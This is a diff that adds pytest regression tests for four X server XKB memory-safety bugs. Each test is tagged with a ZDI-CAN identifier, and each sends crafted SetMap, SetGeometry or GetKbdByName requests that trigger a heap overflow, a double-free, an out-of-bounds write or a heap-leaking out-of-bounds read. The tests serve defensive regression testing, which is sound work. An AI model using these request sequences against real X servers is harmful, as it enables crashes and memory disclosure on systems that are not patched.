@@ -167,6 +167,110 @@ class TestXkbSetMapOverflows:
             "Server crashed - CheckKeyActions totalActs mismatch OOB"
         )
 
+    @pytest.mark.asan
+    def test_resize_key_type_size_syms_overflow(self, xserver, xkb_xclient):
+        """
+        ZDI-CAN-31834: XkbResizeKeyType numeric truncation in size_syms.
+
+        size_syms is declared as unsigned short (16-bit) in XkbClientMapRec.
+        When XkbResizeKeyType() computes (nTotal * 15) / 10 for the new
+        size_syms, the 32-bit result is truncated to 16 bits, causing an
+        undersized calloc. The subsequent copy loop writes based on the
+        actual key count, overflowing the heap buffer.
+
+        Phase 1: Add a custom key type with numLevels=2 and configure all
+        keys (248) with 4 groups using that type.
+        Phase 2: Resize the type to numLevels=63, causing nTotal to exceed
+        65535 and triggering the unsigned short truncation in size_syms.
+        """
+        xclient, opcode = xkb_xclient
+
+        # Query current keymap to learn key range and type count
+        get_map = xkb.GetMapRequest(
+            opcode=opcode,
+            full=xkb.XkbKeyTypesMask | xkb.XkbKeySymsMask,
+        )
+        xclient.send_request(get_map)
+        resp = xclient.recv_response(timeout=5.0)
+        assert isinstance(resp, X11Reply), f"Expected GetMap reply, got {resp}"
+        reply = xkb.GetMapReply.from_bytes(resp.data[:32], resp.data[32:])
+
+        min_key = reply.min_key_code
+        max_key = reply.max_key_code
+        n_keys = max_key - min_key + 1
+        n_types = reply.n_types + reply.first_type  # total types
+        type_idx = n_types  # index of the new type we'll add
+        num_lvls_initial = 2
+        groups = 4
+        syms_per_key = groups * num_lvls_initial  # 8
+
+        # Phase 1: Add new type (numLevels=2) + set all keys with 4 groups
+        # xkbKeyTypeWireDesc: 8 bytes
+        type_wire = struct.pack("<BBHBBBB", 0, 0, 0, num_lvls_initial, 0, 0, 0)
+
+        # xkbSymMapWireDesc (8 bytes) + syms per key
+        sym_data = b""
+        for _ in range(n_keys):
+            sym_data += struct.pack(
+                "<BBBBBBH",
+                type_idx,  # kt_index[0]
+                type_idx,  # kt_index[1]
+                type_idx,  # kt_index[2]
+                type_idx,  # kt_index[3]
+                groups,  # groupInfo
+                num_lvls_initial,  # width
+                syms_per_key,  # nSyms
+            )
+            # sym data: symsPerKey keysyms
+            for s in range(syms_per_key):
+                sym_data += struct.pack("<I", 0x61 + s)
+
+        total_syms = n_keys * syms_per_key
+
+        payload1 = type_wire + sym_data
+        req1 = xkb.SetMapRequest(
+            opcode=opcode,
+            present=xkb.XkbKeyTypesMask | xkb.XkbKeySymsMask,
+            flags=xkb.XkbSetMapResizeTypes,
+            min_key_code=min_key,
+            max_key_code=max_key,
+            first_type=type_idx,
+            n_types=1,
+            first_key_sym=min_key,
+            n_key_syms=n_keys,
+            total_syms=total_syms & 0xFFFF,
+            payload=payload1,
+        )
+        xclient.send_request(req1)
+        resp = xclient.recv_response(timeout=5.0)
+        if isinstance(resp, X11Error):
+            pytest.skip(f"Phase 1 SetMap failed: error {resp.error_code}")
+
+        assert xserver.is_alive, "Server crashed during phase 1 setup"
+
+        # Phase 2: Resize type to numLevels=63 to trigger overflow
+        new_levels = 63
+        type_wire2 = struct.pack("<BBHBBBB", 0, 0, 0, new_levels, 0, 0, 0)
+
+        req2 = xkb.SetMapRequest(
+            opcode=opcode,
+            present=xkb.XkbKeyTypesMask,
+            flags=0,
+            min_key_code=min_key,
+            max_key_code=max_key,
+            first_type=type_idx,
+            n_types=1,
+            payload=type_wire2,
+        )
+        xclient.send_request(req2)
+        time.sleep(0.5)
+
+        assert xserver.is_alive, (
+            "Server crashed - XkbResizeKeyType size_syms truncation: "
+            "(nTotal * 15) / 10 overflows unsigned short, causing "
+            "undersized calloc and heap buffer overflow"
+        )
+
 
 class TestXkbSetGeometry:
     """Tests for XKB SetGeometry OOB vulnerabilities."""
@@ -393,6 +497,141 @@ class TestXkbSetGeometry:
 
         assert xserver.is_alive, (
             "Server crashed - SetGeometry overlay rowUnder off-by-one"
+        )
+
+    @pytest.mark.asan
+    def test_text_doodad_double_free(self, xserver, xkb_xclient):
+        """
+        ZDI-CAN-31221: _CheckSetDoodad() frees doodad->text.text on error
+        when the subsequent font string parse fails, but does not NULL the
+        pointer. The doodad has already been added to the geometry by
+        XkbAddGeomDoodad, so XkbFreeGeometry() → _XkbClearDoodad() frees
+        the same pointer again, causing a double-free.
+
+        The request provides a valid text string ("AAAA") followed by a
+        font string with length=200 but no data, causing _GetCountedString
+        to fail the bounds check and triggering the error path.
+        """
+        xclient, opcode = xkb_xclient
+
+        n_colors = 2
+        color_data = self._build_colors(n_colors)
+        name_atom = xclient.intern_atom("TestGeomDoubleFree")
+        shape_atom = xclient.intern_atom("TestShapeDF")
+        doodad_atom = xclient.intern_atom("TestDoodadDF")
+
+        label_font = xkb.build_counted_string("")
+
+        # 1 shape with 0 outlines (minimal valid shape)
+        shape_data = xkb.ShapeWire(
+            name=shape_atom,
+            n_outlines=0,
+            primary_ndx=xkb.XkbNoShape,
+            approx_ndx=xkb.XkbNoShape,
+        ).to_bytes()
+
+        # TextDoodad with valid text but malformed font (length=200, no data)
+        doodad_data = xkb.TextDoodadWire(
+            name=doodad_atom,
+            color_ndx=0,
+            text="AAAA",
+            font_length_override=200,  # extends past request → bounds check fails
+        ).to_bytes()
+
+        payload = label_font + color_data + shape_data + doodad_data
+
+        req = xkb.SetGeometryRequest(
+            opcode=opcode,
+            n_shapes=1,
+            n_sections=0,
+            n_colors=n_colors,
+            n_doodads=1,
+            base_color_ndx=0,
+            label_color_ndx=1,
+            name_atom=name_atom,
+            payload=payload,
+        )
+        xclient.send_request(req)
+        time.sleep(0.5)
+
+        assert xserver.is_alive, (
+            "Server crashed - TextDoodad double-free: _CheckSetDoodad frees "
+            "text.text on error without NULLing, then _XkbClearDoodad frees again"
+        )
+
+
+class TestXkbChangeKeycodeRange:
+    """Tests for XKB ChangeKeycodeRange vulnerabilities."""
+
+    @pytest.mark.asan
+    def test_names_keys_oob_write(self, xserver, xkb_xclient):
+        """
+        ZDI-CAN-31941: Incomplete fix regression in XkbChangeKeycodeRange.
+
+        Commit a3171732d ("xkb: Always use MAP_LENGTH keymap size")
+        converted most XKB allocations to use MAP_LENGTH (256) but missed
+        XkbAllocNames(), which still allocates names->keys to
+        max_key_code + 1. XkbChangeKeycodeRange() assumes MAP_LENGTH and
+        memsets up to index 255, overflowing the undersized buffer.
+
+        The test loads a keycodes component with max_key_code < 255 via
+        GetKbdByName, then sends SetMap with maxKeyCode=255 to trigger the
+        grow branch in XkbChangeKeycodeRange.
+        """
+        xclient, opcode = xkb_xclient
+
+        # XkbGBN_AllComponentsMask
+        XkbGBN_AllComponentsMask = 0x00FF
+
+        # Build GetKbdByName request with sun(type6) keycodes
+        # Component names: keymap(empty), keycodes=sun(type6), types(empty),
+        #                  compat(empty), symbols(empty), geometry(empty)
+        kc_name = b"sun(type6)"
+        names = (
+            b"\x00"  # keymap (empty)
+            + bytes([len(kc_name)])
+            + kc_name  # keycodes
+            + b"\x00"  # types (empty)
+            + b"\x00"  # compat (empty)
+            + b"\x00"  # symbols (empty)
+            + b"\x00"  # geometry (empty)
+        )
+
+        req = xkb.GetKbdByNameRequest(
+            opcode=opcode,
+            need=XkbGBN_AllComponentsMask,
+            want=XkbGBN_AllComponentsMask,
+            load=1,
+            payload=names,
+        )
+        xclient.send_request(req)
+        resp = xclient.recv_response(timeout=5.0)
+
+        if isinstance(resp, X11Error):
+            pytest.skip(
+                f"GetKbdByName failed with error {resp.error_code} - "
+                "sun(type6) keycodes may not be available"
+            )
+
+        assert xserver.is_alive, "Server crashed during GetKbdByName"
+
+        # Now send SetMap with maxKeyCode=255 to trigger XkbChangeKeycodeRange
+        # present=0 means no actual map data, just triggers the grow
+        setmap_body = struct.pack("<HHH BB", xkb.XkbUseCoreKbd, 0, 0, 8, 255)
+        setmap_body += b"\x00" * 24  # remaining SetMap header fields
+        req2 = xkb.SetMapRequest(
+            opcode=opcode,
+            present=0,
+            min_key_code=8,
+            max_key_code=255,
+            payload=b"",
+        )
+        xclient.send_request(req2)
+        time.sleep(0.5)
+
+        assert xserver.is_alive, (
+            "Server crashed - XkbChangeKeycodeRange names->keys OOB write: "
+            "XkbAllocNames allocates max_key_code+1 but memset uses MAP_LENGTH"
         )
 
 
@@ -748,4 +987,165 @@ class TestXkbSetMapMapWidths:
 
         assert xserver.is_alive, (
             "Server crashed - mapWidths stack OOB write (ZDI-CAN-30161)"
+        )
+
+
+class TestXkbSetMapDesync:
+    """Tests for XKB SetMap key-width/action-count desync vulnerabilities."""
+
+    @pytest.mark.asan
+    def test_setmap_width_action_count_desync(self, xserver, xkb_xclient):
+        """
+        ZDI-CAN-32408: XKB SetMap key-width/action-count desync OOB read.
+
+        CheckKeySyms populates symsPerKey[] with new widths for keys in the
+        request range, then continues for keys beyond the range starting
+        at index i = nKeySyms (not firstKeySym + nKeySyms). When firstKeySym
+        is large and nKeySyms is 1, the second loop overwrites
+        symsPerKey[target] with the old width from the existing map.
+
+        CheckKeyActions then validates the wire action count against the
+        stale old width and accepts it. In _XkbSetMap, SetKeySyms widens
+        the key (resizing actions to nGroups * newWidth), but SetKeyActions
+        then resizes again to the old count. A subsequent XkbGetMap reads
+        XkbKeyNumActions (derived from the new width) entries from the
+        shorter allocation, causing an OOB heap read. The leaked bytes
+        are sent back to the client in the GetMap reply.
+        """
+        xclient, opcode = xkb_xclient
+
+        # Step 1: Get current keymap
+        reply = xclient.xkb_get_map(
+            opcode,
+            full=xkb.XkbKeyTypesMask | xkb.XkbKeySymsMask,
+        )
+        assert reply is not None, "Initial GetMap failed"
+
+        min_key = reply.min_key_code
+        max_key = reply.max_key_code
+        n_types = reply.total_types
+        first_key_sym = reply.first_key_sym
+
+        # Find a target key near max_key_code that has nonzero syms.
+        # We pick a key with small n_syms so the desync between old
+        # and new width is large.
+        target_key = None
+        target_sym = None
+        for i in range(len(reply.sym_maps) - 1, -1, -1):
+            sm = reply.sym_maps[i]
+            if sm.n_syms > 0 and sm.n_syms < 63:
+                target_key = first_key_sym + i
+                target_sym = sm
+                break
+        if target_key is None or target_sym is None:
+            pytest.skip("Could not find a suitable target key")
+
+        old_n_syms = target_sym.n_syms
+
+        # Step 2: Fill action slots on earlier keys so our target's
+        # action allocation is tightly bounded by the heap.
+        fillers = []
+        for i, sm in enumerate(reply.sym_maps):
+            kc = first_key_sym + i
+            if kc >= target_key:
+                break
+            if sm.n_syms > 0:
+                fillers.append((kc, sm.n_syms))
+        fillers = fillers[:96]
+
+        if fillers:
+            first_filler = fillers[0][0]
+            last_filler = fillers[-1][0]
+            filler_range = last_filler - first_filler + 1
+            filler_by_key = {kc: ns for kc, ns in fillers}
+            counts = bytearray()
+            total_filler_acts = 0
+            for kc in range(first_filler, last_filler + 1):
+                ns = filler_by_key.get(kc, 0)
+                counts.append(ns)
+                total_filler_acts += ns
+            filler_payload = bytes(counts) + b"\x00" * ((4 - len(counts) % 4) % 4)
+            filler_payload += b"\x00" * (total_filler_acts * 8)
+
+            filler_req = xkb.SetMapRequest(
+                opcode=opcode,
+                present=xkb.XkbKeyActionsMask,
+                min_key_code=min_key,
+                max_key_code=max_key,
+                first_key_act=first_filler,
+                n_key_acts=filler_range,
+                total_acts=total_filler_acts,
+                payload=filler_payload,
+            )
+            xclient.send_request(filler_req.to_bytes())
+            time.sleep(0.05)
+
+        # Step 3: Send the vulnerable SetMap that widens the target key
+        # to 63 levels while providing old_n_syms actions.
+        # The desync: CheckKeySyms writes the new width to symsPerKey[target],
+        # but its second loop (starting at i=nKeySyms=1, not firstKeySym+1)
+        # overwrites symsPerKey[target] with the old width from the existing
+        # map. CheckKeyActions then accepts old_n_syms as valid.
+        wide_levels = 63
+        new_type_idx = n_types
+
+        # New key type: 63 levels, no map entries, no preserve
+        type_wire = struct.pack("<BBHBBBB", 0, 0, 0, wide_levels, 0, 0, 0)
+
+        # Sym map for the target key using the new wide type
+        sym_wire = struct.pack(
+            "<BBBBBBH",
+            new_type_idx,  # kt_index[0]
+            0,  # kt_index[1]
+            0,  # kt_index[2]
+            0,  # kt_index[3]
+            1,  # groupInfo (1 group)
+            wide_levels,  # width
+            wide_levels,  # nSyms
+        )
+        # Keysym data
+        sym_wire += b"\x00\x00\x00\x00" * wide_levels
+
+        # Action count: use the old width (this is the desync)
+        action_counts = bytes([old_n_syms]) + b"\x00" * 3  # padded to 4
+        action_data = b"\x00" * (old_n_syms * 8)
+
+        payload = type_wire + sym_wire + action_counts + action_data
+
+        vuln_req = xkb.SetMapRequest(
+            opcode=opcode,
+            present=xkb.XkbKeyTypesMask | xkb.XkbKeySymsMask | xkb.XkbKeyActionsMask,
+            flags=xkb.XkbSetMapResizeTypes,
+            min_key_code=min_key,
+            max_key_code=max_key,
+            first_type=new_type_idx,
+            n_types=1,
+            first_key_sym=target_key,
+            n_key_syms=1,
+            total_syms=wide_levels,
+            first_key_act=target_key,
+            n_key_acts=1,
+            total_acts=old_n_syms,
+            payload=payload,
+        )
+        xclient.send_request(vuln_req.to_bytes())
+        time.sleep(0.1)
+
+        assert xserver.is_alive, "Server crashed during SetMap - unexpected"
+
+        # Step 4: Trigger the OOB read via GetMap for the target key's actions
+        get_req = xkb.GetMapRequest(
+            opcode=opcode,
+            partial=xkb.XkbKeyActionsMask,
+            first_key_act=target_key,
+            n_key_acts=1,
+        )
+        xclient.send_request(get_req.to_bytes())
+        time.sleep(0.5)
+
+        assert xserver.is_alive, (
+            "Server crashed - XKB SetMap width/action desync caused OOB read "
+            "in XkbWriteKeyActions when XkbKeyNumActions derived action count "
+            "from widened key_sym_map.width but the action array was sized to "
+            "the old count (ZDI-CAN-32408)"
         )
